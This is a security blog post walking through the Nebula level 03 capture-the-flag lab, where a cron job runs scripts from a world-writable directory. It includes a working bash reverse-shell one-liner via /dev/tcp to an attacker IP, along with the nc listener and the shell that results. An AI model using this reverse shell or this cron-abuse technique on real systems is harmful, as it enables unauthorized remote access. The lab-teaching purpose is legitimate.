<!DOCTYPE html>
<html lang="en">

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" type="text/css" href="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.0.2/cookieconsent.min.css" />
<script async defer src="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.0.2/cookieconsent.min.js"></script>
<script>
window.addEventListener("load", function(){
window.cookieconsent.initialise({
  "palette": {
    "popup": {
      "background": "#424242"
    },
    "button": {
      "background": "#2a7ae2"
    }
  },
  "content": {
    "href": "/privacy-policy"
  }
})});
</script>
  
  
  
  <title>Exploit Exercises: Nebula Level 03</title>
  <meta name="description" content="">
  
    
    <meta name="keywords" content="Lucian Nitescu nebula writeups level flag getflag exploit exercise tutorial solution">
  

  <link rel="stylesheet" href="/assets/main.css">
  <link rel="canonical" href="https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-03/">
  
  
  <link rel="alternate" type="application/rss+xml" title="Lucian Nitescu" href="https://nitesculucian.github.io/feed.xml">

  

  
  <meta name="twitter:card" content="summary">
  
  <meta name="twitter:title" content="Exploit Exercises: Nebula Level 03">
  <meta name="twitter:description" content="">
  
  

  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css?family=Bitter:400,400i,700" rel="stylesheet">

  
  <!-- Google Analytics -->
  <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-107695141-1', 'auto');
    ga('send', 'pageview');

  </script>


</head>


  <body>

    <header class="site-header">

  <div class="wrapper">

    <a class="site-title" href="/">Lucian Nitescu</a>

    <nav class="site-nav">
      
        
        <a class="page-link" href="/">Home</a>
      
        
        <a class="page-link" href="/about/">Whoami</a>
      
        
        <a class="page-link" href="/archives/">Archives</a>
      
    </nav>
    <br>Security Blog
  </div>

</header>


    <main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    
      <h1 class="post-title" itemprop="name headline">Exploit Exercises: Nebula Level 03</h1>
    
    <p class="post-meta"><time datetime="2018-07-16T15:48:00-03:00" itemprop="datePublished">Jul 16, 2018</time> •
  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        <a href="/categories/nebula/">nebula</a>,
      
    
      
    
      
    
      
    
  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        <a href="/categories/writeups/">writeups</a>
      
    
      
    
      
    
      
    
      
    
  



</p>
  </header>

  <div class="post-content" itemprop="articleBody">
    <p><img src="/uploads/Screenshot%20from%202018-07-16%2000-20-16.png" alt="Image of Nebula Terminal" /></p>

<p>Check the home directory of flag03 and take note of the files there.</p>

<p>There is a crontab that is called every couple of minutes.</p>

<p>To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03.</p>

<h3 id="source-code">Source code</h3>

<p>There is no source code available for this level</p>

<h3 id="solution">Solution</h3>

<p>Let’s jump in!</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">level03@nebula:/home/flag03$</span> <span class="nb">ls</span> <span class="nt">-al</span>
<span class="go">total 6
drwxr-x--- 3 flag03 level03  103 Nov 20  2011 .
drwxr-xr-x 1 root   root      80 Aug 27  2012 ..
-rw-r--r-- 1 flag03 flag03   220 May 18  2011 .bash_logout
-rw-r--r-- 1 flag03 flag03  3353 May 18  2011 .bashrc
-rw-r--r-- 1 flag03 flag03   675 May 18  2011 .profile
drwxrwxrwx 2 flag03 flag03     3 Aug 18  2012 writable.d
-rwxr-xr-x 1 flag03 flag03    98 Nov 20  2011 writable.sh
</span></code></pre></div></div>

<p>Interesting! Let’s get more info about the task.</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">level03@nebula:/home/flag03$</span> <span class="nb">cat </span>writable.sh
<span class="gp">#</span><span class="o">!</span>/bin/sh
<span class="go">
</span><span class="gp">for i in /home/flag03/writable.d/* ;</span> <span class="k">do</span>
<span class="gp">	(ulimit -t 5;</span> bash <span class="nt">-x</span> <span class="s2">"</span><span class="nv">$i</span><span class="s2">"</span><span class="o">)</span>
<span class="gp">	rm -f "$</span>i<span class="s2">"
</span><span class="go">done

</span><span class="gp">level03@nebula:/home/flag03$</span> <span class="nb">cd</span> ./writable.d/
<span class="gp">level03@nebula:/home/flag03/writable.d$</span> <span class="nb">ls</span> <span class="nt">-al</span>
<span class="go">total 0
drwxrwxrwx 2 flag03 flag03    3 Aug 18  2012 .
drwxr-x--- 3 flag03 level03 103 Nov 20  2011 ..
</span><span class="gp">level03@nebula:/home/flag03/writable.d$</span>
</code></pre></div></div>

<p>We have been told from the beginning that there is a crontab that is called every couple of minutes. But what is a crontab?</p>

<p>Wikipedia: The software utility Cron is a time-based job scheduler in Unix-like computer operating systems. People who set up and maintain software environments use cron to schedule jobs (commands or shell scripts) to run periodically at fixed times, dates, or intervals. It typically automates system maintenance or administration—though its general-purpose nature makes it useful for things like downloading files from the Internet and downloading email at regular intervals.</p>

<p>We will assume that the crontab is executing the only script we have “writable.sh”. Let’s look again at the code:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>

<span class="k">for </span>i <span class="k">in</span> /home/flag03/writable.d/<span class="k">*</span> <span class="p">;</span> <span class="k">do</span>
	<span class="o">(</span><span class="nb">ulimit</span> <span class="nt">-t</span> 5<span class="p">;</span> bash <span class="nt">-x</span> <span class="s2">"</span><span class="nv">$i</span><span class="s2">"</span><span class="o">)</span> <span class="o">(</span>1<span class="o">)</span>
	<span class="nb">rm</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$i</span><span class="s2">"</span> <span class="o">(</span>2<span class="o">)</span>
<span class="k">done</span>
</code></pre></div></div>

<p>Well, simple! At line (1) we are executing a bash script and at line (2) we are removing that bash script from “/home/flag03/writable.d/*”. Fine, let’s get a shell!</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lucian@vm:~$</span> nc <span class="nt">-nvlp</span> 8080
<span class="go">Listening on [0.0.0.0] (family 0, port 8080
</span></code></pre></div></div>

<p>Now let’s prepare our script.</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">level03@nebula:/home/flag03$</span> <span class="nb">cd </span>writable.d/
<span class="gp">level03@nebula:/home/flag03/writable.d$</span> <span class="nb">echo</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/192.168.0.104/8080 0&gt;&amp;1"</span> <span class="o">&gt;</span> shell.sh
<span class="gp">level03@nebula:/home/flag03/writable.d$</span> <span class="nb">cat </span>shell.sh
<span class="gp">bash -i &gt;</span>&amp; /dev/tcp/192.168.0.104/8080 0&gt;&amp;1
</code></pre></div></div>

<p>Done. Now we wait for like 5 minutes to in order to get the crontab execution.</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lucian@vm:~$</span> nc <span class="nt">-nvlp</span> 8080
<span class="go">Listening on [0.0.0.0] (family 0, port 8080)
Connection from [192.168.0.100] port 8080 [tcp/*] accepted (family 2, sport 45702)
bash: no job control in this shell
</span><span class="gp">flag03@nebula:~$</span> <span class="nb">id</span>
<span class="go">id
uid=996(flag03) gid=996(flag03) groups=996(flag03)
</span><span class="gp">flag03@nebula:~$</span> getflag
<span class="go">getflag
You have successfully executed getflag on a target account
</span><span class="gp">flag03@nebula:~$</span>
</code></pre></div></div>

<p>See you in the next tutorial!</p>

  </div>

  
    <div class="post-comments" itemprop="comment">
      <hr />
<h1>Comments</h1>
<div id="disqus_thread"></div>
<script>

/**
*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
/*
var disqus_config = function () {
this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
};
*/
(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = 'https://nitesculucian.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

    </div>
  

</article>

      </div>
    </main>

    <footer class="site-footer">

  <div class="wrapper">

    <p>
      

&copy; Lucian Nitescu - Powered by <a href="https://jekyllrb.com">Jekyll</a> &amp; <a href="https://github.com/yous/whiteglass">whiteglass</a> - Subscribe via <a href="https://nitesculucian.github.io/feed.xml">RSS</a>

      | <a href="/privacy-policy" >Privacy Policy</a>
    </p>

  </div>

</footer>


  </body>

</html>
